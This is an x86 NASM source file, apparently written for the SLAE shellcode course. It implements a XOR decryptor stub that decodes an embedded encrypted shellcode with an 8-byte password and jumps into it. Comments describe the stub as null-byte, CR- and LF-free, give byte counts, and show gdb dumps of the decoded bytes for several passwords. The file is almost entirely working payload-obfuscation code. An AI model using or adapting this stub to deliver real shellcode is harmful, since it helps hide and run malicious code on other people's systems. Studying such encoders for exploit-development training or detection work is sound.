; Filename: decrypt-xor-pass.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com/
;
; Purpose:
;	XOR decrypt a shellcode string with a variable length password
;	I don't suggest using much more than 8 bytes for your password but the
;	system will handle as many as you like.
;
; Note:
;	This is the decryptor stub, we've removed the \xcc interrupt
;	and patched in the encrypted shellcode. We are using a password of
;	SLAESLAE here because of the SLAE-431 null byte issue.
;
; Decryptor stub is null, \r, and \n free. Code and passcode (and result)
; are up to you.
;
; Shellcode is 88 bytes. This is broken down to:
;
;	21 bytes of encrypted shellcode.
;	8 bytes of passcode
;	59 bytes decryptor stub
;
; Program Runs:
;
; With a password of AAAAAAAA
;
;(gdb) x/21xb $esi
;0xb7fde03d:	0x70	0x88	0xb6	0xa0	0x11	0x29	0x2f	0x6e
;0xb7fde045:	0x32	0x29	0x29	0x6e	0x6e	0x23	0x28	0xc8
;0xb7fde04d:	0xa2	0xf1	0x4a	0x8c	0xc1
;(gdb)
;
; With a password of AAAAAAAB
;
;(gdb) x/21xb $esi
;0xb7fde03d:	0x73	0x88	0xb6	0xa0	0x11	0x29	0x2f	0x6d
;0xb7fde045:	0x32	0x29	0x29	0x6e	0x6e	0x23	0x2b	0xc8
;0xb7fde04d:	0xa2	0xf1	0x4a	0x8c	0xc1
;(gdb)
;
; Note bytes 1, 8, 15, are different (because we pull the password in reverse
; order.
;
; With a password of SLAE-431
;
;(gdb) x/21xb $esi
;0xb7fde03d:	0x00	0xfa	0xc3	0xcc	0x15	0x29	0x22	0x1e
;0xb7fde045:	0x40	0x5c	0x45	0x6a	0x6e	0x2e	0x58	0xba
;0xb7fde04d:	0xd7	0x9d	0x4e	0x8c	0xcc
;(gdb)
;
; Make careful note of your resulting shellcode - using SLAE-431 results in a
; null value right at the beginning (because 1 is 0x31 and that's the first
; byte of our shellcode.
;


global _start
section .text
_start:
	jmp short caller

encoder:
	pop esi
	lea edi, [esi]

	xor ebx, ebx
	xor ecx, ecx
	mul ecx

	mov cl, codelen
	mov dl, passlen
	dec dl					; 0-n but passlen matches 1-n
						; this is C array[0] discussions all over
						; again :)

encode:
	push ecx				; save codelen
	push eax				; save current byte

	add dl, codelen
	mov cl, byte [esi + edx]		; Current passcode byte
	sub dl, codelen

	mov bl, byte [esi + eax]		; Retrieve current byte of shellcode
	xor bl, cl				; Encode/ Decode it
	mov byte [edi], bl			; Put it back where it belongs

	inc edi					; Move to the next byte

	dec edx
	test dl, 0xff				; If we rolled around :)
	jne continue

	mov dl, passlen				; We reached -1, roll it back up.
	dec dl

continue:

	pop eax					; restore current byte
	inc eax					; shift it forward
	pop ecx					; Restore codelen

	dec ecx					; Count down, make sure that we have
	jnz encode				; or have not reached the end of our
						; shellcode

	jmp short shellcode

caller:
	call encoder

	shellcode: db 0x74,0x88,0xbb,0xb2,0x15,0x29,0x22,0x6a,0x32,0x24,0x3b,0x6a,0x6e,0x2e,0x2c,0xc8,0xaf,0xe3,0x4e,0x8c,0xcc
	codelen equ $-shellcode

	passcode: db 0x53,0x4c,0x41,0x45,0x53,0x4c,0x41,0x45
	passlen equ $-passcode
